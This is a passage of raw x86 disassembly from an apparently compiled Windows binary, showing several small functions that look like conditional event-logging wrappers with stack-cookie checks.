  405371:	test   al,al
  405373:	je     0x4053cf
  405375:	mov    eax,DWORD PTR [ebx+0x40]
  405378:	and    DWORD PTR [ebp-0x24],0x0
  40537c:	and    DWORD PTR [ebp-0x1c],0x0
  405380:	push   0x4
  405382:	mov    DWORD PTR [ebp-0x150],eax
  405388:	lea    eax,[ebp-0x150]
  40538e:	pop    ebx
  40538f:	mov    DWORD PTR [ebp-0x28],eax
  405392:	mov    DWORD PTR [ebp-0x20],ebx
  405395:	call   DWORD PTR ds:0x4090a4
  40539b:	and    DWORD PTR [ebp-0x14],0x0
  40539f:	and    DWORD PTR [ebp-0xc],0x0
  4053a3:	mov    DWORD PTR [ebp-0x14c],eax
  4053a9:	lea    eax,[ebp-0x14c]
  4053af:	mov    DWORD PTR [ebp-0x18],eax
  4053b2:	mov    DWORD PTR [ebp-0x10],ebx
  4053b5:	lea    eax,[ebp-0x48]
  4053b8:	mov    edx,0x401765
  4053bd:	push   eax
  4053be:	push   ebx
  4053bf:	mov    ecx,edi
  4053c1:	mov    eax,DWORD PTR [esi+0x18]
  4053c4:	push   0x0
  4053c6:	add    eax,0x8
  4053c9:	push   eax
  4053ca:	call   0x402687
  4053cf:	cmp    DWORD PTR [esi+0x10],0x0
  4053d3:	je     0x4053dd
  4053d5:	lea    ecx,[esi+0x4]
  4053d8:	call   0x404050
  4053dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4053e0:	pop    edi
  4053e1:	pop    esi
  4053e2:	xor    ecx,ebp
  4053e4:	pop    ebx
  4053e5:	call   0x406b70
  4053ea:	mov    esp,ebp
  4053ec:	pop    ebp
  4053ed:	ret    
  4053ee:	int3   
  4053ef:	int3   
  4053f0:	int3   
  4053f1:	int3   
  4053f2:	int3   
  4053f3:	mov    edi,edi
  4053f5:	push   ebp
  4053f6:	mov    ebp,esp
  4053f8:	and    esp,0xfffffff8
  4053fb:	sub    esp,0x64
  4053fe:	mov    eax,ds:0x408004
  405403:	xor    eax,esp
  405405:	mov    DWORD PTR [esp+0x60],eax
  405409:	push   ebx
  40540a:	push   esi
  40540b:	push   edi
  40540c:	mov    esi,ecx
  40540e:	call   0x406418
  405413:	mov    eax,DWORD PTR [esi+0x18]
  405416:	xor    ebx,ebx
  405418:	mov    edi,DWORD PTR [eax+0x28]
  40541b:	cmp    DWORD PTR [edi],0x5
  40541e:	jbe    0x4054af
  405424:	push   0x2000
  405429:	push   ebx
  40542a:	mov    ecx,edi
  40542c:	call   0x402718
  405431:	test   al,al
  405433:	je     0x4054af
  405435:	call   DWORD PTR ds:0x4090a4
  40543b:	mov    DWORD PTR [esp+0x14],eax
  40543f:	lea    eax,[esp+0x14]
  405443:	mov    DWORD PTR [esp+0x38],eax
  405447:	mov    eax,DWORD PTR [ebp+0x8]
  40544a:	mov    DWORD PTR [esp+0xc],eax
  40544e:	lea    eax,[esp+0xc]
  405452:	mov    DWORD PTR [esp+0x48],eax
  405456:	movzx  eax,BYTE PTR [ebp+0xc]
  40545a:	push   0x4
  40545c:	pop    ecx
  40545d:	mov    DWORD PTR [esp+0x10],eax
  405461:	lea    eax,[esp+0x10]
  405465:	mov    DWORD PTR [esp+0x3c],ebx
  405469:	mov    DWORD PTR [esp+0x40],ecx
  40546d:	mov    DWORD PTR [esp+0x44],ebx
  405471:	mov    DWORD PTR [esp+0x4c],ebx
  405475:	mov    DWORD PTR [esp+0x50],ecx
  405479:	mov    DWORD PTR [esp+0x54],ebx
  40547d:	mov    DWORD PTR [esp+0x58],eax
  405481:	mov    DWORD PTR [esp+0x5c],ebx
  405485:	mov    DWORD PTR [esp+0x60],ecx
  405489:	mov    DWORD PTR [esp+0x64],ebx
  40548d:	lea    eax,[esp+0x18]
  405491:	mov    ecx,esi
  405493:	push   eax
  405494:	push   0x5
  405496:	call   0x4063f0
  40549b:	push   eax
  40549c:	mov    eax,DWORD PTR [esi+0x18]
  40549f:	mov    edx,0x4017a8
  4054a4:	add    eax,0x8
  4054a7:	mov    ecx,edi
  4054a9:	push   eax
  4054aa:	call   0x402687
  4054af:	cmp    DWORD PTR [esi+0x10],ebx
  4054b2:	jne    0x4054bc
  4054b4:	lea    ecx,[esi+0x4]
  4054b7:	call   0x404011
  4054bc:	mov    ecx,DWORD PTR [esp+0x6c]
  4054c0:	pop    edi
  4054c1:	pop    esi
  4054c2:	pop    ebx
  4054c3:	xor    ecx,esp
  4054c5:	call   0x406b70
  4054ca:	mov    esp,ebp
  4054cc:	pop    ebp
  4054cd:	ret    0x8
  4054d0:	int3   
  4054d1:	int3   
  4054d2:	int3   
  4054d3:	int3   
  4054d4:	int3   
  4054d5:	mov    edi,edi
  4054d7:	push   ebp
  4054d8:	mov    ebp,esp
  4054da:	and    esp,0xfffffff8
  4054dd:	sub    esp,0x2c
  4054e0:	mov    eax,ds:0x408004
  4054e5:	xor    eax,esp
  4054e7:	mov    DWORD PTR [esp+0x28],eax
  4054eb:	push   esi
  4054ec:	mov    esi,DWORD PTR [ecx+0x18]
  4054ef:	mov    ecx,DWORD PTR [esi+0x28]
  4054f2:	cmp    DWORD PTR [ecx],0x5
  4054f5:	jbe    0x40551e
  4054f7:	push   0x2000
  4054fc:	push   0x0
  4054fe:	call   0x402718
  405503:	test   al,al
  405505:	je     0x40551e
  405507:	lea    eax,[esp+0x8]
  40550b:	mov    edx,0x401f0d
  405510:	push   eax
  405511:	push   0x2
  405513:	push   0x0
  405515:	lea    eax,[esi+0x8]
  405518:	push   eax
  405519:	call   0x402687
  40551e:	mov    ecx,DWORD PTR [esp+0x2c]
  405522:	pop    esi
  405523:	xor    ecx,esp
  405525:	call   0x406b70
  40552a:	mov    esp,ebp
  40552c:	pop    ebp
  40552d:	ret    
  40552e:	int3   
  40552f:	int3   
  405530:	int3   
  405531:	int3   
  405532:	int3   
  405533:	mov    edi,edi
  405535:	push   ebp
  405536:	mov    ebp,esp
  405538:	and    esp,0xfffffff8
  40553b:	sub    esp,0x2c
  40553e:	mov    eax,ds:0x408004
  405543:	xor    eax,esp
  405545:	mov    DWORD PTR [esp+0x28],eax
  405549:	push   esi
  40554a:	mov    esi,DWORD PTR [ecx+0x18]
  40554d:	mov    ecx,DWORD PTR [esi+0x28]
  405550:	cmp    DWORD PTR [ecx],0x5
  405553:	jbe    0x40557c
  405555:	push   0x2000
  40555a:	push   0x0
  40555c:	call   0x402718
  405561:	test   al,al
  405563:	je     0x40557c
  405565:	lea    eax,[esp+0x8]
  405569:	mov    edx,0x401ef2
  40556e:	push   eax
  40556f:	push   0x2
  405571:	push   0x0
  405573:	lea    eax,[esi+0x8]
  405576:	push   eax
  405577:	call   0x402687
  40557c:	mov    ecx,DWORD PTR [esp+0x2c]
  405580:	pop    esi
  405581:	xor    ecx,esp
  405583:	call   0x406b70
  405588:	mov    esp,ebp
  40558a:	pop    ebp
  40558b:	ret    
  40558c:	int3   
  40558d:	int3   
  40558e:	int3   
  40558f:	int3   
  405590:	int3   
  405591:	mov    edi,edi
  405593:	push   ebp
  405594:	mov    ebp,esp
  405596:	and    esp,0xfffffff8
  405599:	sub    esp,0x2c
  40559c:	mov    eax,ds:0x408004
  4055a1:	xor    eax,esp
  4055a3:	mov    DWORD PTR [esp+0x28],eax
  4055a7:	push   esi
  4055a8:	mov    esi,DWORD PTR [ecx+0x18]
  4055ab:	mov    ecx,DWORD PTR [esi+0x28]
  4055ae:	cmp    DWORD PTR [ecx],0x5
  4055b1:	jbe    0x4055da
  4055b3:	push   0x2000
  4055b8:	push   0x0
  4055ba:	call   0x402718
  4055bf:	test   al,al
  4055c1:	je     0x4055da
  4055c3:	lea    eax,[esp+0x8]
  4055c7:	mov    edx,0x401862
  4055cc:	push   eax
  4055cd:	push   0x2
  4055cf:	push   0x0
  4055d1:	lea    eax,[esi+0x8]
  4055d4:	push   eax
  4055d5:	call   0x402687
  4055da:	mov    ecx,DWORD PTR [esp+0x2c]
  4055de:	pop    esi
  4055df:	xor    ecx,esp
  4055e1:	call   0x406b70
  4055e6:	mov    esp,ebp
  4055e8:	pop    ebp
  4055e9:	ret    
  4055ea:	int3   
  4055eb:	int3   
  4055ec:	int3   
  4055ed:	int3   
  4055ee:	int3   
  4055ef:	int3   
  4055f0:	mov    edi,edi
  4055f2:	push   ebp
  4055f3:	mov    ebp,esp
  4055f5:	sub    esp,0x164
  4055fb:	mov    eax,ds:0x408004
  405600:	xor    eax,ebp
  405602:	mov    DWORD PTR [ebp-0x4],eax
  405605:	push   ebx
  405606:	push   esi
  405607:	mov    esi,ecx
  405609:	push   edi
  40560a:	mov    edi,DWORD PTR [esi+0x18]
  40560d:	mov    eax,DWORD PTR [edi+0x40]
  405610:	test   eax,eax
  405612:	jns    0x40561e
  405614:	cmp    eax,DWORD PTR [edi+0x48]
  405617:	jne    0x40561e
  405619:	add    edi,0x44
  40561c:	jmp    0x405620
  40561e:	xor    edi,edi
  405620:	call   0x406476
  405625:	test   edi,edi
  405627:	je     0x4057b8
  40562d:	mov    eax,DWORD PTR [esi+0x18]
  405630:	mov    eax,DWORD PTR [eax+0x28]
  405633:	mov    DWORD PTR [ebp-0x150],eax
  405639:	cmp    DWORD PTR [eax],0x5
  40563c:	jbe    0x40582f
  405642:	push   0x2000
  405647:	push   0x0
  405649:	mov    ecx,eax
  40564b:	call   0x402718
  405650:	test   al,al
  405652:	je     0x40582f
  405658:	mov    eax,DWORD PTR [edi+0x4]
  40565b:	lea    ecx,[ebp-0x118]
  405661:	mov    edx,DWORD PTR [edi+0x1c]
  405664:	and    DWORD PTR [ebp-0x124],0x0
  40566b:	and    DWORD PTR [ebp-0x11c],0x0
  405672:	push   0x4
  405674:	mov    DWORD PTR [ebp-0x158],eax
  40567a:	lea    eax,[ebp-0x158]
  405680:	pop    ebx
  405681:	mov    DWORD PTR [ebp-0x128],eax
  405687:	mov    DWORD PTR [ebp-0x120],ebx
  40568d:	call   0x402752
  405692:	mov    edx,DWORD PTR [edi+0x44]
  405695:	lea    eax,[edi+0x20]
  405698:	and    DWORD PTR [ebp-0x104],0x0
  40569f:	lea    ecx,[ebp-0xf8]
  4056a5:	and    DWORD PTR [ebp-0xfc],0x0
  4056ac:	mov    DWORD PTR [ebp-0x108],eax
  4056b2:	mov    DWORD PTR [ebp-0x100],ebx
  4056b8:	call   0x402752
  4056bd:	mov    eax,DWORD PTR [edi]
  4056bf:	lea    ecx,[ebp-0xd8]
  4056c5:	mov    edx,DWORD PTR [edi+0xc]
  4056c8:	and    DWORD PTR [ebp-0xe4],0x0
  4056cf:	and    DWORD PTR [ebp-0xdc],0x0
  4056d6:	mov    DWORD PTR [ebp-0x160],eax
  4056dc:	lea    eax,[ebp-0x160]
  4056e2:	mov    DWORD PTR [ebp-0xe8],eax
  4056e8:	mov    DWORD PTR [ebp-0xe0],ebx
  4056ee:	call   0x402789
  4056f3:	mov    eax,DWORD PTR [edi+0x10]
  4056f6:	lea    ecx,[ebp-0xb8]
  4056fc:	mov    edx,DWORD PTR [edi+0x28]
  4056ff:	and    DWORD PTR [ebp-0xc4],0x0
  405706:	and    DWORD PTR [ebp-0xbc],0x0
  40570d:	mov    DWORD PTR [ebp-0x15c],eax
  405713:	lea    eax,[ebp-0x15c]
  405719:	mov    DWORD PTR [ebp-0xc8],eax
  40571f:	mov    DWORD PTR [ebp-0xc0],ebx
  405725:	call   0x402752
  40572a:	mov    eax,DWORD PTR [edi+0x2c]
  40572d:	lea    ecx,[ebp-0x98]
  405733:	mov    edx,DWORD PTR [edi+0x30]
  405736:	and    DWORD PTR [ebp-0xa4],0x0
  40573d:	and    DWORD PTR [ebp-0x9c],0x0
  405744:	mov    DWORD PTR [ebp-0x154],eax
  40574a:	lea    eax,[ebp-0x154]
  405750:	mov    DWORD PTR [ebp-0xa8],eax
  405756:	mov    DWORD PTR [ebp-0xa0],ebx
  40575c:	call   0x402752
  405761:	mov    edx,DWORD PTR [edi+0x34]
  405764:	lea    ecx,[ebp-0x88]
  40576a:	call   0x402789
  40576f:	mov    eax,DWORD PTR [edi+0x38]
  405772:	lea    ecx,[ebp-0x68]
  405775:	mov    edx,DWORD PTR [edi+0x3c]
  405778:	and    DWORD PTR [ebp-0x74],0x0
  40577c:	and    DWORD PTR [ebp-0x6c],0x0
  405780:	mov    DWORD PTR [ebp-0x14c],eax
  405786:	lea    eax,[ebp-0x14c]
  40578c:	mov    DWORD PTR [ebp-0x78],eax
  40578f:	mov    DWORD PTR [ebp-0x70],ebx
  405792:	call   0x402752
  405797:	mov    edx,DWORD PTR [edi+0x40]
  40579a:	lea    ecx,[ebp-0x58]
  40579d:	call   0x402789
  4057a2:	mov    ecx,DWORD PTR [ebp-0x150]
  4057a8:	lea    eax,[ebp-0x148]
  4057ae:	push   eax
  4057af:	push   0x10
  4057b1:	mov    edx,0x4019e2
  4057b6:	jmp    0x405821
  4057b8:	mov    ebx,DWORD PTR [esi+0x18]
  4057bb:	mov    edi,DWORD PTR [ebx+0x28]
  4057be:	cmp    DWORD PTR [edi],0x5
  4057c1:	jbe    0x40582f
  4057c3:	push   0x2000
  4057c8:	push   0x0
  4057ca:	mov    ecx,edi
  4057cc:	call   0x402718
  4057d1:	test   al,al
  4057d3:	je     0x40582f
  4057d5:	mov    eax,DWORD PTR [ebx+0x40]
  4057d8:	and    DWORD PTR [ebp-0x24],0x0
  4057dc:	and    DWORD PTR [ebp-0x1c],0x0
  4057e0:	push   0x4
  4057e2:	mov    DWORD PTR [ebp-0x150],eax
  4057e8:	lea    eax,[ebp-0x150]
  4057ee:	pop    ebx
  4057ef:	mov    DWORD PTR [ebp-0x28],eax
  4057f2:	mov    DWORD PTR [ebp-0x20],ebx
  4057f5:	call   DWORD PTR ds:0x4090a4
  4057fb:	and    DWORD PTR [ebp-0x14],0x0
  4057ff:	and    DWORD PTR [ebp-0xc],0x0
  405803:	mov    DWORD PTR [ebp-0x14c],eax
  405809:	lea    eax,[ebp-0x14c]
  40580f:	mov    DWORD PTR [ebp-0x18],eax
  405812:	mov    DWORD PTR [ebp-0x10],ebx
  405815:	lea    eax,[ebp-0x48]
  405818:	mov    edx,0x401d87
  40581d:	push   eax
  40581e:	push   ebx
  40581f:	mov    ecx,edi
  405821:	mov    eax,DWORD PTR [esi+0x18]
  405824:	push   0x0
  405826:	add    eax,0x8
  405829:	push   eax
  40582a:	call   0x402687
  40582f:	cmp    DWORD PTR [esi+0x10],0x0
  405833:	je     0x40583d
  405835:	lea    ecx,[esi+0x4]
  405838:	call   0x404050
  40583d:	mov    ecx,DWORD PTR [ebp-0x4]
  405840:	pop    edi
  405841:	pop    esi
  405842:	xor    ecx,ebp
  405844:	pop    ebx
  405845:	call   0x406b70
  40584a:	mov    esp,ebp
  40584c:	pop    ebp
  40584d:	ret    
  40584e:	int3   
  40584f:	int3   
  405850:	int3   
  405851:	int3   
  405852:	int3   
  405853:	mov    edi,edi
  405855:	push   ebp
  405856:	mov    ebp,esp
  405858:	and    esp,0xfffffff8
  40585b:	sub    esp,0x74
  40585e:	mov    eax,ds:0x408004
  405863:	xor    eax,esp
  405865:	mov    DWORD PTR [esp+0x70],eax
  405869:	push   ebx
  40586a:	mov    ebx,DWORD PTR [ebp+0x8]
  40586d:	push   esi
  40586e:	push   edi
  40586f:	mov    esi,ecx
  405871:	call   0x406418
  405876:	mov    eax,DWORD PTR [esi+0x18]
  405879:	mov    edi,DWORD PTR [eax+0x28]
  40587c:	cmp    DWORD PTR [edi],0x5
  40587f:	jbe    0x405928
  405885:	push   0x2000
  40588a:	push   0x0
  40588c:	mov    ecx,edi
  40588e:	call   0x402718
  405893:	test   al,al
  405895:	je     0x405928
  40589b:	call   DWORD PTR ds:0x4090a4
  4058a1:	and    DWORD PTR [esp+0x3c],0x0
  4058a6:	lea    ecx,[esp+0x48]
  4058aa:	and    DWORD PTR [esp+0x44],0x0
  4058af:	mov    edx,ebx
  4058b1:	mov    DWORD PTR [esp+0x14],eax
  4058b5:	lea    eax,[esp+0x14]
  4058b9:	mov    DWORD PTR [esp+0x38],eax
  4058bd:	mov    DWORD PTR [esp+0x40],0x4
  4058c5:	call   0x402789
  4058ca:	mov    eax,DWORD PTR [ebp+0xc]
  4058cd:	xor    edx,edx
  4058cf:	mov    DWORD PTR [esp+0xc],eax
  4058d3:	lea    eax,[esp+0xc]
  4058d7:	mov    DWORD PTR [esp+0x58],eax
  4058db:	movzx  eax,BYTE PTR [ebp+0x10]
  4058df:	push   0x4
  4058e1:	pop    ecx
  4058e2:	mov    DWORD PTR [esp+0x10],eax
  4058e6:	lea    eax,[esp+0x10]
  4058ea:	mov    DWORD PTR [esp+0x5c],edx
  4058ee:	mov    DWORD PTR [esp+0x60],ecx
  4058f2:	mov    DWORD PTR [esp+0x64],edx
  4058f6:	mov    DWORD PTR [esp+0x68],eax
  4058fa:	mov    DWORD PTR [esp+0x6c],edx
  4058fe:	mov    DWORD PTR [esp+0x70],ecx
  405902:	mov    DWORD PTR [esp+0x74],edx
  405906:	lea    eax,[esp+0x18]
  40590a:	mov    ecx,esi
  40590c:	push   eax
  40590d:	push   0x6
  40590f:	call   0x4063f0
  405914:	push   eax
  405915:	mov    eax,DWORD PTR [esi+0x18]
  405918:	mov    edx,0x40198c
  40591d:	add    eax,0x8
  405920:	mov    ecx,edi
  405922:	push   eax
  405923:	call   0x402687
  405928:	cmp    DWORD PTR [esi+0x10],0x0
  40592c:	jne    0x405936
  40592e:	lea    ecx,[esi+0x4]
  405931:	call   0x404011
  405936:	mov    ecx,DWORD PTR [esp+0x7c]
  40593a:	pop    edi
  40593b:	pop    esi
  40593c:	pop    ebx
  40593d:	xor    ecx,esp
  40593f:	call   0x406b70
  405944:	mov    esp,ebp
  405946:	pop    ebp
  405947:	ret    0xc
  40594a:	int3   
  40594b:	int3   
  40594c:	int3   
  40594d:	int3   
  40594e:	int3   
  40594f:	int3   
  405950:	mov    edi,edi
  405952:	push   ebp
  405953:	mov    ebp,esp
  405955:	sub    esp,0x164
  40595b:	mov    eax,ds:0x408004
  405960:	xor    eax,ebp
  405962:	mov    DWORD PTR [ebp-0x4],eax
  405965:	push   ebx
  405966:	push   esi
  405967:	mov    esi,ecx
  405969:	push   edi
  40596a:	mov    edi,DWORD PTR [esi+0x18]
  40596d:	mov    eax,DWORD PTR [edi+0x40]
  405970:	test   eax,eax
  405972:	jns    0x40597e
  405974:	cmp    eax,DWORD PTR [edi+0x48]
  405977:	jne    0x40597e
  405979:	add    edi,0x44
  40597c:	jmp    0x405980
  40597e:	xor    edi,edi
  405980:	call   0x406476
  405985:	test   edi,edi
  405987:	je     0x405b18
  40598d:	mov    eax,DWORD PTR [esi+0x18]
  405990:	mov    eax,DWORD PTR [eax+0x28]
  405993:	mov    DWORD PTR [ebp-0x150],eax
  405999:	cmp    DWORD PTR [eax],0x5
  40599c:	jbe    0x405b8f
  4059a2:	push   0x2000
  4059a7:	push   0x0
  4059a9:	mov    ecx,eax
  4059ab:	call   0x402718
  4059b0:	test   al,al
  4059b2:	je     0x405b8f
  4059b8:	mov    eax,DWORD PTR [edi+0x4]
  4059bb:	lea    ecx,[ebp-0x118]
  4059c1:	mov    edx,DWORD PTR [edi+0x1c]
  4059c4:	and    DWORD PTR [ebp-0x124],0x0
  4059cb:	and    DWORD PTR [ebp-0x11c],0x0
  4059d2:	push   0x4
  4059d4:	mov    DWORD PTR [ebp-0x158],eax
  4059da:	lea    eax,[ebp-0x158]
  4059e0:	pop    ebx
  4059e1:	mov    DWORD PTR [ebp-0x128],eax
  4059e7:	mov    DWORD PTR [ebp-0x120],ebx
  4059ed:	call   0x402752
  4059f2:	mov    edx,DWORD PTR [edi+0x44]
  4059f5:	lea    eax,[edi+0x20]
  4059f8:	and    DWORD PTR [ebp-0x104],0x0
  4059ff:	lea    ecx,[ebp-0xf8]
  405a05:	and    DWORD PTR [ebp-0xfc],0x0
  405a0c:	mov    DWORD PTR [ebp-0x108],eax
  405a12:	mov    DWORD PTR [ebp-0x100],ebx
  405a18:	call   0x402752
  405a1d:	mov    eax,DWORD PTR [edi]
  405a1f:	lea    ecx,[ebp-0xd8]
  405a25:	mov    edx,DWORD PTR [edi+0xc]
  405a28:	and    DWORD PTR [ebp-0xe4],0x0
  405a2f:	and    DWORD PTR [ebp-0xdc],0x0
  405a36:	mov    DWORD PTR [ebp-0x160],eax
  405a3c:	lea    eax,[ebp-0x160]
  405a42:	mov    DWORD PTR [ebp-0xe8],eax
  405a48:	mov    DWORD PTR [ebp-0xe0],ebx
  405a4e:	call   0x402789
  405a53:	mov    eax,DWORD PTR [edi+0x10]
  405a56:	lea    ecx,[ebp-0xb8]
  405a5c:	mov    edx,DWORD PTR [edi+0x28]
  405a5f:	and    DWORD PTR [ebp-0xc4],0x0
  405a66:	and    DWORD PTR [ebp-0xbc],0x0
  405a6d:	mov    DWORD PTR [ebp-0x15c],eax
  405a73:	lea    eax,[ebp-0x15c]
  405a79:	mov    DWORD PTR [ebp-0xc8],eax
  405a7f:	mov    DWORD PTR [ebp-0xc0],ebx
  405a85:	call   0x402752
  405a8a:	mov    eax,DWORD PTR [edi+0x2c]
  405a8d:	lea    ecx,[ebp-0x98]
  405a93:	mov    edx,DWORD PTR [edi+0x30]
  405a96:	and    DWORD PTR [ebp-0xa4],0x0
  405a9d:	and    DWORD PTR [ebp-0x9c],0x0
  405aa4:	mov    DWORD PTR [ebp-0x154],eax
  405aaa:	lea    eax,[ebp-0x154]
  405ab0:	mov    DWORD PTR [ebp-0xa8],eax
  405ab6:	mov    DWORD PTR [ebp-0xa0],ebx
  405abc:	call   0x402752
  405ac1:	mov    edx,DWORD PTR [edi+0x34]
  405ac4:	lea    ecx,[ebp-0x88]
  405aca:	call   0x402789
  405acf:	mov    eax,DWORD PTR [edi+0x38]
  405ad2:	lea    ecx,[ebp-0x68]
  405ad5:	mov    edx,DWORD PTR [edi+0x3c]
  405ad8:	and    DWORD PTR [ebp-0x74],0x0
  405adc:	and    DWORD PTR [ebp-0x6c],0x0
  405ae0:	mov    DWORD PTR [ebp-0x14c],eax
  405ae6:	lea    eax,[ebp-0x14c]
  405aec:	mov    DWORD PTR [ebp-0x78],eax
  405aef:	mov    DWORD PTR [ebp-0x70],ebx
  405af2:	call   0x402752
  405af7:	mov    edx,DWORD PTR [edi+0x40]
  405afa:	lea    ecx,[ebp-0x58]
  405afd:	call   0x402789
  405b02:	mov    ecx,DWORD PTR [ebp-0x150]
  405b08:	lea    eax,[ebp-0x148]
  405b0e:	push   eax
  405b0f:	push   0x10
  405b11:	mov    edx,0x401bef
  405b16:	jmp    0x405b81
  405b18:	mov    ebx,DWORD PTR [esi+0x18]
  405b1b:	mov    edi,DWORD PTR [ebx+0x28]
  405b1e:	cmp    DWORD PTR [edi],0x5
  405b21:	jbe    0x405b8f
  405b23:	push   0x2000
  405b28:	push   0x0
  405b2a:	mov    ecx,edi
  405b2c:	call   0x402718
  405b31:	test   al,al
  405b33:	je     0x405b8f
  405b35:	mov    eax,DWORD PTR [ebx+0x40]
  405b38:	and    DWORD PTR [ebp-0x24],0x0
  405b3c:	and    DWORD PTR [ebp-0x1c],0x0
  405b40:	push   0x4
  405b42:	mov    DWORD PTR [ebp-0x150],eax
  405b48:	lea    eax,[ebp-0x150]
  405b4e:	pop    ebx
  405b4f:	mov    DWORD PTR [ebp-0x28],eax
  405b52:	mov    DWORD PTR [ebp-0x20],ebx
  405b55:	call   DWORD PTR ds:0x4090a4
  405b5b:	and    DWORD PTR [ebp-0x14],0x0
  405b5f:	and    DWORD PTR [ebp-0xc],0x0
  405b63:	mov    DWORD PTR [ebp-0x14c],eax
  405b69:	lea    eax,[ebp-0x14c]
  405b6f:	mov    DWORD PTR [ebp-0x18],eax
  405b72:	mov    DWORD PTR [ebp-0x10],ebx
  405b75:	lea    eax,[ebp-0x48]
  405b78:	mov    edx,0x401d0b
  405b7d:	push   eax
  405b7e:	push   ebx
  405b7f:	mov    ecx,edi
  405b81:	mov    eax,DWORD PTR [esi+0x18]
  405b84:	push   0x0
  405b86:	add    eax,0x8
  405b89:	push   eax
  405b8a:	call   0x402687
  405b8f:	cmp    DWORD PTR [esi+0x10],0x0
  405b93:	je     0x405b9d
  405b95:	lea    ecx,[esi+0x4]
  405b98:	call   0x404050
  405b9d:	mov    ecx,DWORD PTR [ebp-0x4]
  405ba0:	pop    edi
  405ba1:	pop    esi
  405ba2:	xor    ecx,ebp
  405ba4:	pop    ebx
  405ba5:	call   0x406b70
  405baa:	mov    esp,ebp
  405bac:	pop    ebp
  405bad:	ret    
  405bae:	int3   
  405baf:	int3   
  405bb0:	int3   
  405bb1:	int3   
  405bb2:	int3   
  405bb3:	mov    edi,edi
  405bb5:	push   ebp
  405bb6:	mov    ebp,esp
  405bb8:	and    esp,0xfffffff8
  405bbb:	sub    esp,0x7c
  405bbe:	mov    eax,ds:0x408004
  405bc3:	xor    eax,esp
  405bc5:	mov    DWORD PTR [esp+0x78],eax
  405bc9:	push   ebx
  405bca:	push   esi
  405bcb:	push   edi
  405bcc:	mov    esi,ecx
  405bce:	call   0x406418
  405bd3:	mov    eax,DWORD PTR [esi+0x18]
  405bd6:	xor    ebx,ebx
  405bd8:	mov    edi,DWORD PTR [eax+0x28]
  405bdb:	cmp    DWORD PTR [edi],0x5
  405bde:	jbe    0x405c8e
  405be4:	push   0x2000
  405be9:	push   ebx
  405bea:	mov    ecx,edi
  405bec:	call   0x402718
  405bf1:	test   al,al
  405bf3:	je     0x405c8e
  405bf9:	call   DWORD PTR ds:0x4090a4
  405bff:	mov    DWORD PTR [esp+0x14],eax
  405c03:	lea    eax,[esp+0x14]
  405c07:	mov    DWORD PTR [esp+0x40],eax
  405c0b:	mov    eax,DWORD PTR [ebp+0x8]
  405c0e:	mov    DWORD PTR [esp+0x1c],eax
  405c12:	lea    eax,[esp+0x1c]
  405c16:	mov    DWORD PTR [esp+0x50],eax
  405c1a:	mov    eax,DWORD PTR [ebp+0xc]
  405c1d:	mov    DWORD PTR [esp+0x10],eax
  405c21:	lea    eax,[esp+0x10]
  405c25:	mov    DWORD PTR [esp+0x60],eax
  405c29:	movzx  eax,BYTE PTR [ebp+0x10]
  405c2d:	push   0x4
  405c2f:	pop    ecx
  405c30:	mov    DWORD PTR [esp+0x18],eax
  405c34:	lea    eax,[esp+0x18]
  405c38:	mov    DWORD PTR [esp+0x44],ebx
  405c3c:	mov    DWORD PTR [esp+0x48],ecx
  405c40:	mov    DWORD PTR [esp+0x4c],ebx
  405c44:	mov    DWORD PTR [esp+0x54],ebx
  405c48:	mov    DWORD PTR [esp+0x58],ecx
  405c4c:	mov    DWORD PTR [esp+0x5c],ebx
  405c50:	mov    DWORD PTR [esp+0x64],ebx
  405c54:	mov    DWORD PTR [esp+0x68],ecx
  405c58:	mov    DWORD PTR [esp+0x6c],ebx
  405c5c:	mov    DWORD PTR [esp+0x70],eax
  405c60:	mov    DWORD PTR [esp+0x74],ebx
  405c64:	mov    DWORD PTR [esp+0x78],ecx
  405c68:	mov    DWORD PTR [esp+0x7c],ebx
  405c6c:	lea    eax,[esp+0x20]
  405c70:	mov    ecx,esi
  405c72:	push   eax
  405c73:	push   0x6
  405c75:	call   0x4063f0
  405c7a:	push   eax
  405c7b:	mov    eax,DWORD PTR [esi+0x18]
  405c7e:	mov    edx,0x401719
  405c83:	add    eax,0x8
  405c86:	mov    ecx,edi
  405c88:	push   eax
  405c89:	call   0x402687
  405c8e:	cmp    DWORD PTR [esi+0x10],ebx
  405c91:	jne    0x405c9b
  405c93:	lea    ecx,[esi+0x4]
  405c96:	call   0x404011
  405c9b:	mov    ecx,DWORD PTR [esp+0x84]
  405ca2:	pop    edi
  405ca3:	pop    esi
  405ca4:	pop    ebx
  405ca5:	xor    ecx,esp
  405ca7:	call   0x406b70
  405cac:	mov    esp,ebp
  405cae:	pop    ebp
  405caf:	ret    0xc
  405cb2:	int3   
  405cb3:	int3   
  405cb4:	int3   
  405cb5:	int3   
  405cb6:	int3   
  405cb7:	mov    edi,edi
  405cb9:	push   ebp
  405cba:	mov    ebp,esp
  405cbc:	and    esp,0xfffffff8
  405cbf:	sub    esp,0x2c
  405cc2:	mov    eax,ds:0x408004
  405cc7:	xor    eax,esp
  405cc9:	mov    DWORD PTR [esp+0x28],eax
  405ccd:	push   esi
  405cce:	mov    esi,DWORD PTR [ecx+0x18]
  405cd1:	mov    ecx,DWORD PTR [esi+0x28]
  405cd4:	cmp    DWORD PTR [ecx],0x5
  405cd7:	jbe    0x405d00
  405cd9:	push   0x2000
  405cde:	push   0x0
  405ce0:	call   0x402718
  405ce5:	test   al,al
  405ce7:	je     0x405d00
  405ce9:	lea    eax,[esp+0x8]
  405ced:	mov    edx,0x401cf1
  405cf2:	push   eax
  405cf3:	push   0x2
  405cf5:	push   0x0
  405cf7:	lea    eax,[esi+0x8]
  405cfa:	push   eax
  405cfb:	call   0x402687
  405d00:	mov    ecx,DWORD PTR [esp+0x2c]
  405d04:	pop    esi
  405d05:	xor    ecx,esp
  405d07:	call   0x406b70
  405d0c:	mov    esp,ebp
  405d0e:	pop    ebp
  405d0f:	ret    
  405d10:	int3   
  405d11:	int3   
  405d12:	int3   
  405d13:	int3   
  405d14:	int3   
  405d15:	mov    edi,edi
  405d17:	push   esi
  405d18:	mov    esi,ecx
  405d1a:	lea    ecx,[esi+0xbc]
  405d20:	call   0x40661b
  405d25:	lea    ecx,[esi+0x1c]
  405d28:	call   0x405d43
  405d2d:	lea    ecx,[esi+0x4]
  405d30:	cmp    DWORD PTR [ecx+0xc],0x0
  405d34:	je     0x405d3c
  405d36:	pop    esi
  405d37:	jmp    0x404050
  405d3c:	pop    esi
  405d3d:	ret    
  405d3e:	int3   
  405d3f:	int3   
  405d40:	int3   
  405d41:	int3   
  405d42:	int3   
  405d43:	mov    edi,edi
